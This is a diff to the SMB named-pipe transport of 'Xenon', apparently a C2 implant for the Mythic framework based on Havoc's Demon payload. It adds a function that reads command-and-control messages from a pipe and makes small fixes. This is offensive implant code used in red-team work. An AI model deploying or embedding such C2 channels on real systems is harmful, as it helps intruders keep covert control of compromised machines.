@@ -10,10 +10,11 @@
 /* This file is the the Mythic SMB profile */
 #ifdef SMB_TRANSPORT
 
-/* Ref - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c */
-
 /**
- * @brief Initialize Named Pipe if not setup, then send data to pipe.
+ * @brief Send data to SMB C2 Channel
+ * 
+ * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
+ * @return BOOL  
  */
 BOOL SmbSend(PPackage package)
 {
@@ -28,7 +29,7 @@ BOOL SmbSend(PPackage package)
 		SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );
 
 		xenonConfig->SmbPipe = CreateNamedPipeA(
-				xenonConfig->SmbPipename,		 // Named pipe
+				xenonConfig->SmbPipename,		 // Named pipe string
 				PIPE_ACCESS_DUPLEX,              // read/write access
 				PIPE_TYPE_MESSAGE     |          // message type pipe
 				PIPE_READMODE_MESSAGE |          // message-read mode
@@ -75,6 +76,88 @@ BOOL SmbSend(PPackage package)
 END:
 
 	return Success;
+}
+
+
+/**
+ * @brief Read data from SMB C2 Channel
+ * 
+ * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
+ * @return BOOL  
+ */
+BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
+{
+    BOOL success = FALSE;
+    DWORD bytesRead = 0;
+    DWORD totalRead = 0;
+    DWORD chunkSize = 4096;
+    BYTE  buffer[4096];
+
+    *ppOutData = NULL;
+    *pOutLen   = 0;
+
+    // This call will block until data is available (PIPE_WAIT)
+    while (TRUE)
+    {
+        BOOL result = ReadFile(xenonConfig->SmbPipe, buffer, chunkSize, &bytesRead, NULL);
+        if (!result)
+        {
+            DWORD err = GetLastError();
+
+            if (err == ERROR_MORE_DATA)
+            {
+                // Message is larger than our buffer — append and continue
+            }
+            else if (err == ERROR_BROKEN_PIPE)
+            {
+                printf("Pipe closed by the other end.\n");
+                goto END;
+            }
+            else
+            {
+                printf("ReadFile failed with %lu\n", err);
+                goto END;
+            }
+        }
+
+        if (bytesRead > 0)
+        {
+            // Expand destination buffer
+            PBYTE newBuf = (PBYTE)LocalAlloc(LPTR, totalRead + bytesRead);
+            if (!newBuf)
+            {
+                printf("LocalAlloc failed.\n");
+                goto END;
+            }
+
+            if (*ppOutData)
+            {
+                memcpy(newBuf, *ppOutData, totalRead);
+                LocalFree(*ppOutData);
+            }
+
+            memcpy(newBuf + totalRead, buffer, bytesRead);
+            *ppOutData = newBuf;
+            totalRead += bytesRead;
+        }
+
+        // Exit loop when the message has been fully read
+        if (result || GetLastError() == ERROR_BROKEN_PIPE)
+            break;
+    }
+
+    *pOutLen = totalRead;
+    success = TRUE;
+
+END:
+    if (!success && *ppOutData)
+    {
+        LocalFree(*ppOutData);
+        *ppOutData = NULL;
+        *pOutLen   = 0;
+    }
+
+    return success;
 }
 
 
@@ -188,7 +271,7 @@ VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
  * @param package buffer to write
  * @return pipe write successful or not
  */
-BOOL PipeWrite(Handle hPipe, PPackage package) 
+BOOL PipeWrite(HANDLE hPipe, PPackage package) 
 {
     DWORD Written = 0;
     DWORD Total   = 0;
@@ -200,6 +283,8 @@ BOOL PipeWrite(Handle hPipe, PPackage package)
 
         Total += Written;
     } while ( Total < package->length );
+
+    _dbg("Finished. Sent %d bytes to SMB Comms channel.", Written);
 
     return TRUE;
 }
